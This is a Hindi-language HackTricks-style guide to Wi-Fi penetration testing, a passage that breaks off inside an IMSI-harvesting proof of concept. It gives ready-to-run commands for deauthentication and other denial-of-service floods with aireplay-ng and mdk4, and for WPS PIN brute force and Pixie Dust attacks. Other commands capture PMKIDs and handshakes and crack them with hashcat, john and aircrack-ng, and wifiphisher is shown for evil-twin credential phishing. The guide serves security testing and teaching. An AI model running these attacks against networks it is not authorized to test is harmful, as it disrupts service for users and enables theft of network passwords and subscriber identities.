# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi बुनियादी कमांड
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## उपकरण

### Hijacker & NexMon (Android का आंतरिक Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**docker के साथ airgeddon चलाएँ**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
स्रोत: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

यह Evil Twin, KARMA, और Known Beacons हमलों को अंजाम दे सकता है और फिर एक phishing template का उपयोग करके नेटवर्क का वास्तविक पासवर्ड प्राप्त करने या social network credentials को कैप्चर करने में सफल हो सकता है।
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

यह टूल **WPS/WEP/WPA-PSK** attacks को automate करता है। यह स्वचालित रूप से:

- interface को monitor mode में सेट करता है
- संभावित नेटवर्क्स को scan करता है - और आपको लक्ष्य(ों) चुनने देता है
- यदि WEP है - WEP attacks लॉन्च करता है
- If WPA-PSK
- यदि WPS: Pixie dust attack और bruteforce attack (सावधान रहें — brute-force attack में काफी समय लग सकता है). ध्यान दें कि यह null PIN या database/generated PINs को ट्राय नहीं करता।
- AP से PMKID capture करने की कोशिश करता है ताकि उसे crack किया जा सके
- AP के clients को deauthenticate करने की कोशिश करता है ताकि handshake capture किया जा सके
- यदि PMKID या Handshake मिले, तो top5000 passwords का उपयोग करके bruteforce करने की कोशिश करता है।

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- सभी को disconnect करें (या एक specific ESSID/Client)
- Random fake APs -- नेट्स छिपाएं, संभावित crash scanners
- Overload AP -- AP को अक्षम करने की कोशिश करें (आम तौर पर ज्यादा उपयोगी नहीं)
- WIDS -- IDS के साथ खेलें
- TKIP, EAPOL -- कुछ APs को DoS करने के लिए विशिष्ट attacks
- **Cracking**
- Crack **WEP** (कई tools और methods)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- captive portal creds capture करने और/या LAN attacks करने के लिए उपयोगी
- **WPA-PSK** Evil Twin -- यदि पासवर्ड पता हो तो नेटवर्क attacks के लिए उपयोगी
- **WPA-MGT** -- कंपनी credentials capture करने के लिए उपयोगी
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- captive portal creds capture करने और/या LAN attacks के लिए उपयोगी
- **+ WPA** -- WPA handshakes capture करने के लिए उपयोगी

## DOS

### Deauthentication Packets

**Description from** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, Wi‑Fi hacking में एक प्रचलित तरीका, 'management' frames को forge करके devices को **forcefully disconnect devices from a network** करने में शामिल हैं। ये unencrypted पैकेट्स clients को यह भ्रमित कर देते हैं कि वे legitimate network से हैं, जिससे attackers WPA handshakes को cracking के उद्देश्यों के लिए collect कर सकते हैं या नेटवर्क कनेक्शनों को लगातार बाधित कर सकते हैं। यह तरीका अपनी सादगी में चिंताजनक है, व्यापक रूप से उपयोग होता है और नेटवर्क सुरक्षा के लिए महत्वपूर्ण निहितार्थ रखता है।

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 का मतलब deauthentication है
- 1 भेजने के लिए deauths की संख्या है (आप चाहें तो एक से अधिक भेज सकते हैं); 0 का मतलब है उन्हें लगातार भेजना
- -a 00:14:6C:7E:40:80 access point का MAC address है
- -c 00:0F:B5:34:30:30 उस client का MAC address है जिसे deauthenticate करना है; यदि यह छोड़ा गया तो broadcast deauthentication भेजा जाता है (यह हमेशा काम नहीं करता)
- ath0 interface का नाम है

### Disassociation Packets

**Disassociation packets**, deauthentication packets के समान, Wi-Fi networks में उपयोग होने वाले management frame का एक प्रकार हैं। ये packets किसी डिवाइस (जैसे लैपटॉप या स्मार्टफोन) और access point (AP) के बीच के कनेक्शन को काटने का काम करते हैं। disassociation और deauthentication के बीच मुख्य अंतर उनके उपयोग के परिदृश्यों में निहित होता है। जबकि AP नेटवर्क से rogue devices को स्पष्ट रूप से हटाने के लिए deauthentication packets भेजता है, disassociation packets आमतौर पर तब भेजे जाते हैं जब AP shutdown, restart, या स्थानांतरित हो रहा होता है, जिससे सभी connected nodes का disconnection आवश्यक हो जाता है।

**यह attack mdk4(mode "d") द्वारा किया जा सकता है:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **अधिक DOS attacks by mdk4**

**यहाँ** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

clients पर fake APs दिखाने के लिए beacon frames भेजता है। यह कभी-कभी network scanners और यहाँ तक कि drivers को भी crash कर सकता है!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

रेंज के भीतर सभी पहुँच योग्य Access Points (APs) को authentication frames भेजने से ये APs overload हो सकते हैं, खासकर जब कई clients शामिल हों। यह तीव्र ट्रैफ़िक सिस्टम अस्थिरता का कारण बन सकता है, जिससे कुछ APs freeze या reset भी हो सकते हैं।
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) यह जाँचता है कि कोई SSID सही तरीके से प्रदर्शित हो रहा है और AP की रेंज की पुष्टि करता है। यह तकनीक, wordlist के साथ या बिना **bruteforcing hidden SSIDs** के संयोजन में, छिपे हुए नेटवर्क की पहचान और उनमें पहुँच प्राप्त करने में मदद करती है।

**ATTACK MODE m: Michael Countermeasures Exploitation**

अलग-अलग QoS queues को random या duplicate packets भेजने से **TKIP APs** पर Michael Countermeasures trigger हो सकते हैं, जिससे AP एक मिनट के लिए बंद हो सकता है। यह तरीका एक प्रभावी **DoS** (Denial of Service) हमले की रणनीति है।
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

AP को **EAPOL Start frames** से भर देने पर **fake sessions** बन जाते हैं, जो AP को भारी कर देते हैं और वैध क्लाइंट्स को ब्लॉक कर देते हैं। वैकल्पिक रूप से, **fake EAPOL Logoff messages** इंजेक्ट करने से क्लाइंट्स जबरन डिस्कनेक्ट हो जाते हैं; दोनों तरीके प्रभावी रूप से नेटवर्क सेवा को बाधित करते हैं।
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: IEEE 802.11s mesh नेटवर्क के लिए हमले**

mesh नेटवर्क में लिंक प्रबंधन और रूटिंग पर विभिन्न हमले।

**ATTACK MODE w: WIDS Confusion**

क्लाइंट्स को कई WDS nodes या नकली rogue APs से क्रॉस-कनेक्ट करने से Intrusion Detection and Prevention Systems को प्रभावित किया जा सकता है, जिससे भ्रम पैदा होता है और संभावित सिस्टम दुरुपयोग हो सकता है।
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

एक packet fuzzer जो विविध packet sources और packet manipulation के लिए modifiers के एक व्यापक सेट की पेशकश करता है।

### **Airggedon**

_**Airgeddon**_ पिछले टिप्पणियों में प्रस्तावित अधिकांश attacks प्रदान करता है:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) राउटर से devices को कनेक्ट करने की प्रक्रिया को सरल बनाता है, और उन नेटवर्क्स के लिए setup की speed और सुविधा बढ़ाता है जो **WPA** या **WPA2** Personal से encrypted हैं। यह आसानी से compromise होने वाली **WEP** security के लिए प्रभावी नहीं है। WPS एक 8-digit PIN का उपयोग करता है, जिसे दो हिस्सों में validate किया जाता है, जिससे इसकी combinations की संख्या सीमित (11,000 possibilities) होने के कारण यह brute-force attacks के प्रति संवेदनशील है।

### WPS Bruteforce

इस कार्रवाई के लिए मुख्य रूप से 2 tools हैं: Reaver और Bully.

- **Reaver** को WPS के खिलाफ एक robust और practical attack के रूप में design किया गया है, और इसे विभिन्न access points और WPS implementations के खिलाफ टेस्ट किया गया है।
- **Bully** WPS brute force attack का **new implementation** है, जो C में लिखा गया है। इसके मूल reaver कोड की तुलना में इसके कई फायदे हैं: fewer dependencies, improved memory और cpu performance, endianness का सही handling, और अधिक robust options का सेट।

यह attack **WPS PIN** की vulnerability का फायदा उठाता है, खासकर यह कि पहले चार digits उजागर होते हैं और अंतिम digit checksum के रूप में काम करता है, जिससे brute-force attack आसान हो जाता है। हालांकि, brute-force attacks के खिलाफ बचाव, जैसे आक्रामक attackers के **blocking MAC addresses**, हमले को जारी रखने के लिए **MAC address rotation** की आवश्यकता होती है।

Bully या Reaver जैसे tools से WPS PIN प्राप्त करने पर, attacker WPA/WPA2 PSK का अनुमान लगा सकता है, जिससे **persistent network access** सुनिश्चित हो जाता है।
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

यह परिष्कृत तरीका ज्ञात कमजोरियों का उपयोग करके WPS PINs को लक्षित करता है:

1. **Pre-discovered PINs**: विशिष्ट निर्माताओं से जुड़े ज्ञात PINs का एक डेटाबेस उपयोग करें जो एकसमान WPS PINs का उपयोग करते हों। यह डेटाबेस MAC-addresses के पहले तीन octets को उन निर्माताओं के संभावित PINs के साथ मिलाता है।
2. **PIN Generation Algorithms**: ComputePIN और EasyBox जैसे algorithms का लाभ उठाएँ, जो AP के MAC-address के आधार पर WPS PINs की गणना करते हैं। Arcadyan algorithm को अतिरिक्त रूप से एक device ID की आवश्यकता होती है, जो PIN generation प्रक्रिया में एक और परत जोड़ता है।

### WPS Pixie Dust attack

**Dominique Bongard** ने कुछ Access Points (APs) में secret codes बनाने के तरीके में एक कमजोरी खोजी, जिन्हें **nonces** (**E-S1** और **E-S2**) कहा जाता है। यदि इन nonces का पता लगाया जा सके, तो AP का WPS PIN क्रैक करना आसान हो जाता है। AP PIN को यह दिखाने के लिए एक विशेष कोड (hash) के भीतर प्रकट करता है कि यह वैध है और कोई नकली (rogue) AP नहीं है। ये nonces मूलतः उन "keys" की तरह हैं जो WPS PIN रखने वाले "safe" को खोलते हैं। More on this can be found [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

सरल शब्दों में, समस्या यह है कि कुछ APs ने connection process के दौरान PIN को encrypt करने के लिए पर्याप्त random keys का उपयोग नहीं किया। इससे PIN नेटवर्क के बाहर से अनुमान लगाने के लिए vulnerable हो जाता है (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
यदि आप डिवाइस को monitor mode में स्विच नहीं करना चाहते, या `reaver` और `bully` में कोई समस्या है, तो आप [OneShot-C](https://github.com/nikita-yfh/OneShot-C) आज़मा सकते हैं। यह टूल monitor mode में स्विच किए बिना Pixie Dust attack कर सकता है।
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

कुछ खराब डिज़ाइन किए गए सिस्टम यहां तक कि एक **Null PIN** (एक खाली या मौजूद नहीं PIN) को एक्सेस देने की अनुमति देते हैं, जो कि काफी असामान्य है। टूल **Reaver** इस vulnerability का परीक्षण करने में सक्षम है, जबकि **Bully** नहीं।
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

सभी प्रस्तावित WPS हमले _**airgeddon.**_ का उपयोग करके आसानी से किए जा सकते हैं।

![](<../../images/image (219).png>)

- 5 और 6 आपको **अपना कस्टम PIN** आज़माने देते हैं (यदि आपका कोई है)
- 7 और 8 **Pixie Dust attack** को निष्पादित करते हैं
- 13 आपको **NULL PIN** का परीक्षण करने की अनुमति देता है
- 11 और 12 **चयनित AP से संबंधित PINs को उपलब्ध डेटाबेस से पुनःसंग्रहित करेंगे** और **जनरेट** करेंगे संभावित **PINs** उपयोग करके: ComputePIN, EasyBox और वैकल्पिक रूप से Arcadyan (अनुशंसित, क्यों नहीं?)
- 9 और 10 **हर संभव PIN** का परीक्षण करेंगे

## **WEP**

अब यह काफी टूटा हुआ और आजकल उपयोग में नहीं है। बस जान लें कि _**airgeddon**_ में इस तरह के प्रोटेक्शन पर हमला करने के लिए "All-in-One" नामक एक WEP विकल्प है। अन्य कई टूल भी समान विकल्प प्रदान करते हैं।

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

2018 में, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) एक नया attack method पेश किया, जो अनोखा है क्योंकि यह केवल **एक ही पैकेट** की आवश्यकता रखता है और लक्षित AP से किसी क्लाइंट के कनेक्ट होने की आवश्यकता नहीं होती—केवल हमलावर और AP के बीच इंटरैक्शन।

कई आधुनिक राउटर एसोसिएशन के दौरान **वैकल्पिक फ़ील्ड** को **पहले EAPOL** फ्रेम में जोड़ते हैं, जिसे `Robust Security Network` के रूप में जाना जाता है। इसमें `PMKID` शामिल होता है।

जैसा कि मूल पोस्ट में समझाया गया है, **PMKID** ज्ञात डेटा का उपयोग करके बनाया जाता है:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
ध्यान दें कि यदि "PMK Name" स्थिर है, AP का BSSID और station ज्ञात हैं, और `PMK` पूरी 4-way handshake के `PMK` के समान है, तो **hashcat** इन जानकारियों का उपयोग करके PSK को crack कर के passphrase पुनः प्राप्त कर सकता है!

इन जानकारियों को **gather** करके और password को स्थानीय रूप से **bruteforce** करने के लिए आप निम्न कर सकते हैं:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
यह **PMKIDs captured** **console** में दिखेंगे और \_ **/tmp/attack.pcap**\_ में **saved** भी होंगे।\
अब, इस capture को **hashcat/john** format में convert करके crack करें:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
कृपया ध्यान दें कि एक सही hash का फ़ॉर्मैट **4 हिस्सों** में होता है, जैसे: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`। अगर आपके पास **केवल** **3 हिस्से** ही हैं, तो यह **अमान्य** है (PMKID capture मान्य नहीं था)।

ध्यान दें कि `hcxdumptool` **भी capture handshakes** करता है (ऐसा कुछ दिखाई देगा: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**)। आप इन **handshakes** को `cap2hccapx` का उपयोग करके **hashcat**/**john** फ़ॉर्मेट में रूपांतरित कर सकते हैं।
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_मैंने देखा है कि इस tool से captured कुछ handshakes सही password जानने के बावजूद cracked नहीं हो पाए। मैं सुझाव दूँगा कि यदि संभव हो तो पारंपरिक तरीके से भी handshakes capture करें, या इस tool का उपयोग करके कई handshakes capture करें।_

### Handshake capture

एक हमला **WPA/WPA2** नेटवर्क पर **handshake** capture करके और password को **crack** करने का प्रयास, वह भी **offline**, करके किया जा सकता है। यह प्रक्रिया किसी विशिष्ट नेटवर्क और उसके **BSSID** के किसी विशेष **channel** पर संचार की निगरानी शामिल करती है। यहाँ एक संक्षिप्त मार्गदर्शिका है:

1. लक्षित नेटवर्क का **BSSID**, **channel**, और एक **connected client** पहचानें।
2. निर्दिष्ट channel और BSSID पर नेटवर्क ट्रैफ़िक की निगरानी करने के लिए `airodump-ng` का उपयोग करें, उम्मीद करते हुए कि आप एक handshake capture कर लेंगे। कमांड इस तरह दिखेगा:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. handshake को कैप्चर करने की संभावना बढ़ाने के लिए, क्लाइंट को क्षणिक रूप से नेटवर्क से डिस्कनेक्ट करें ताकि वह पुनः प्रमाणीकरण के लिए मजबूर हो। यह `aireplay-ng` कमांड का उपयोग करके किया जा सकता है, जो क्लाइंट को deauthentication packets भेजता है:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_ध्यान दें कि चूँकि client को deauthenticated किया गया था, यह किसी अलग AP या, कुछ मामलों में, किसी अलग network से कनेक्ट करने की कोशिश कर सकता है._

जब `airodump-ng` में handshake की कुछ जानकारी दिखाई दे, तो इसका मतलब है कि handshake capture हो चुका है और आप listening बंद कर सकते हैं:

![](<../../images/image (172) (1).png>)

जब handshake capture हो जाए तब आप इसे `aircrack-ng` के साथ **crack** कर सकते हैं:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### जाँचें कि फ़ाइल में handshake है या नहीं

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_यदि यह टूल किसी ESSID का अधूरा handshake पूरा होने वाले handshake से पहले पाता है, तो यह वैध handshake का पता नहीं लगाएगा।_

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

**एंटरप्राइज़ WiFi सेटअप में, आपको विभिन्न प्रमाणीकरण विधियाँ मिलेंगी**, जो अलग‑अलग सुरक्षा स्तर और प्रबंधन सुविधाएँ प्रदान करती हैं। जब आप नेटवर्क ट्रैफ़िक की जाँच के लिए `airodump-ng` जैसे टूल्स का उपयोग करते हैं, तो आप इन प्रमाणीकरण प्रकारों के पहचानकर्ताओं को देख सकते हैं। कुछ सामान्य तरीके शामिल हैं:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- यह तरीका EAP-PEAP के भीतर हार्डवेयर टोकन और वन-टाइम पासवर्ड को सपोर्ट करता है। MSCHAPv2 के विपरीत, यह peer challenge का उपयोग नहीं करता और पासवर्ड को access point को plain text में भेजता है, जो downgrade attacks के लिए जोखिम पैदा करता है.
2. **EAP-MD5 (Message Digest 5)**:
- क्लाइंट से पासवर्ड का MD5 हैश भेजना शामिल है। यह **not recommended** है क्योंकि यह शब्दकोश-आधारित अटैकों के प्रति संवेदनशील है, सर्वर authentication की कमी है, और session-specific WEP keys जनरेट करने में असमर्थ है।
3. **EAP-TLS (Transport Layer Security)**:
- authentication के लिए client-side और server-side दोनों सर्टिफिकेट्स का उपयोग करता है और संचार को सुरक्षित रखने के लिए user-based और session-based WEP keys डायनामिक रूप से जनरेट कर सकता है।
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- एन्क्रिप्टेड टनल के माध्यम से पारस्परिक authentication प्रदान करता है, साथ ही डायनामिक, प्रति-यूज़र, प्रति-सेशन WEP keys निकालने का तरीका भी देता है। यह केवल server-side certificates की आवश्यकता रखता है, जबकि क्लाइंट credentials का उपयोग करते हैं।
5. **PEAP (Protected Extensible Authentication Protocol)**:
- TLS टनल बनाकर सुरक्षित संचार के लिए EAP के समान तरीके से काम करता है। टनल द्वारा मिलने वाले सुरक्षा के कारण यह EAP के ऊपर कमजोर authentication प्रोटोकॉल के उपयोग की अनुमति देता है।
- **PEAP-MSCHAPv2**: अक्सर PEAP कहा जाता है; यह कमजोर MSCHAPv2 challenge/response मैकेनिज़्म को एक protective TLS टनल के साथ जोड़ता है।
- **PEAP-EAP-TLS (or PEAP-TLS)**: EAP-TLS के समान है लेकिन सर्टिफिकेट्स आदान-प्रदान करने से पहले TLS टनल शुरू करता है, जो अतिरिक्त सुरक्षा प्रदान करता है।

इन authentication विधियों के बारे में अधिक जानकारी आप यहाँ [https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol] और यहाँ [https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html] पर पा सकते हैं।

### उपयोगकर्ता नाम कैप्चर

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) ऐसा लगता है कि अगर आप **EAP** का उपयोग कर रहे हैं तो **"Identity"** **messages** को **supported** होना चाहिए, और **username** **"Response Identity"** messages में **clear** में भेजा जाएगा।

यहाँ तक कि सबसे सुरक्षित authentication मेथड्स में से एक: **PEAP-EAP-TLS** का उपयोग करते समय भी, **EAP प्रोटोकॉल में भेजे गए username को capture करना** संभव है। इसके लिए, **एक authentication communication को capture करें** (एक चैनल के अंदर `airodump-ng` स्टार्ट करें और उसी इंटरफ़ेस में `wireshark` चलाएँ) और पैकेट्स को `eapol` से फ़िल्टर करें.\
"**Response, Identity**" पैकेट के अंदर, क्लाइंट का **username** दिखाई देगा।

![](<../../images/image (850).png>)

### गुमनाम पहचान

Identity hiding दोनों EAP-PEAP और EAP-TTLS द्वारा समर्थित है। एक WiFi नेटवर्क के संदर्भ में, एक EAP-Identity request आमतौर पर association प्रक्रिया के दौरान access point (AP) द्वारा आरंभ किया जाता है। उपयोगकर्ता की anonymity की सुरक्षा सुनिश्चित करने के लिए, उपयोगकर्ता के डिवाइस पर EAP क्लाइंट का उत्तर केवल प्रारंभिक RADIUS सर्वर द्वारा request को प्रोसेस करने के लिए आवश्यक आवश्यकतम जानकारी ही शामिल करता है। इस अवधारणा को निम्नलिखित परिदृश्यों के माध्यम से समझाया जा सकता है:

- EAP-Identity = anonymous
- इस परिदृश्य में, सभी उपयोगकर्ता अपने उपयोगकर्ता पहचानकर्ता के रूप में pseudonymous "anonymous" का उपयोग करते हैं। प्रारंभिक RADIUS सर्वर EAP-PEAP या EAP-TTLS सर्वर के रूप में कार्य करता है, जो PEAP या TTLS प्रोटोकॉल के सर्वर-साइड को संभालता है। inner (protected) authentication method तब या तो स्थानीय रूप से संभाला जाता है या एक remote (home) RADIUS सर्वर को delegate किया जाता है।
- EAP-Identity = anonymous@realm_x
- इस स्थिति में, विभिन्न realms के उपयोगकर्ता अपनी पहचान छिपाते हुए अपने-अपने realms का संकेत देते हैं। यह प्रारंभिक RADIUS सर्वर को उनके home realms में मौजूद RADIUS सर्वरों को EAP-PEAP या EAP-TTLS अनुरोध proxy करने की अनुमति देता है, जो PEAP या TTLS सर्वर के रूप में कार्य करते हैं। प्रारंभिक RADIUS सर्वर केवल एक RADIUS relay node के रूप में कार्य करता है।
- वैकल्पिक रूप से, प्रारंभिक RADIUS सर्वर EAP-PEAP या EAP-TTLS सर्वर के रूप में कार्य कर सकता है और या तो protected authentication method को संभाल सकता है या इसे किसी अन्य सर्वर को फॉरवर्ड कर सकता है। यह विकल्प विभिन्न realms के लिए अलग नीतियाँ कॉन्फ़िगर करने में सुविधा प्रदान करता है।

EAP-PEAP में, एक बार PEAP सर्वर और PEAP क्लाइंट के बीच TLS टनल स्थापित हो जाने के बाद, PEAP सर्वर एक EAP-Identity request शुरू करता है और इसे TLS टनल के माध्यम से प्रसारित करता है। क्लाइंट इस दूसरे EAP-Identity request का उत्तर TLS टनल के माध्यम से उपयोगकर्ता की असली पहचान वाले EAP-Identity response को भेजकर देता है। यह तरीका 802.11 ट्रैफिक पर किसी भी eavesdropper को उपयोगकर्ता की वास्तविक पहचान प्रकट होने से प्रभावी रूप से रोकता है।

EAP-TTLS थोड़ा अलग प्रक्रिया का पालन करता है। EAP-TTLS के साथ, क्लाइंट आमतौर पर PAP या CHAP का उपयोग करके authentication करता है, जिसे TLS टनल द्वारा सुरक्षित किया जाता है। इस मामले में, क्लाइंट initial TLS संदेश में User-Name attribute और या तो Password या CHAP-Password attribute शामिल करता है जो टनल की स्थापना के बाद भेजा जाता है।

चाहे कोई भी प्रोटोकॉल चुना जाए, PEAP/TTLS सर्वर TLS टनल स्थापित होने के बाद उपयोगकर्ता की वास्तविक पहचान जान जाता है। वास्तविक पहचान user@realm के रूप में या केवल user के रूप में हो सकती है। यदि PEAP/TTLS सर्वर उपयोगकर्ता को authenticate करने के लिए भी जिम्मेदार है, तो अब उसके पास उपयोगकर्ता की पहचान होती है और वह TLS टनल द्वारा सुरक्षित authentication method के साथ आगे बढ़ता है। वैकल्पिक रूप से, PEAP/TTLS सर्वर उपयोगकर्ता के home RADIUS सर्वर को एक नया RADIUS अनुरोध फॉरवर्ड कर सकता है। यह नया RADIUS अनुरोध PEAP या TTLS प्रोटोकॉल लेयर को छोड़ देता है। उन मामलों में जहाँ protected authentication method EAP है, inner EAP संदेश बिना EAP-PEAP या EAP-TTLS wrapper के home RADIUS सर्वर को भेजे जाते हैं। outgoing RADIUS संदेश का User-Name attribute उपयोगकर्ता की वास्तविक पहचान को शामिल करता है, incoming RADIUS अनुरोध के anonymous User-Name की जगह लेता है। जब protected authentication method PAP या CHAP (केवल TTLS द्वारा समर्थित) होता है, तो TLS payload से निकाले गए User-Name और अन्य authentication attributes outgoing RADIUS संदेश में प्रतिस्थापित कर दिए जाते हैं, incoming RADIUS अनुरोध में पाए गए anonymous User-Name और TTLS EAP-Message attributes की जगह।

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm]

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X किसी भी pseudonyms/protected identities या inner EAP के चारों ओर TLS टनल लागू न होने पर unauthenticated identity phase के दौरान permanent subscriber identifier (IMSI) को cleartext में leak कर सकती है।

Where the leak happens (high level):
- 802.11 association SSID तक पूरा होता है (अक्सर carrier offload SSIDs जैसे FreeWifi_secure, eduroam-like operator realms, आदि)।
- Authenticator EAP-Request/Identity भेजता है।
- Vulnerable clients पोषण के बिना EAP-Response/Identity का उत्तर अपने permanent identity = IMSI के रूप में भेजते हैं जो कि किसी 3GPP NAI के रूप में encode होता है।
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- RF सुनने वाला कोई भी व्यक्ति वह फ्रेम पासिवली पढ़ सकता है। किसी 4-way handshake या TLS keying की आवश्यकता नहीं है।

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>विस्तार के लिए क्लिक करें</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

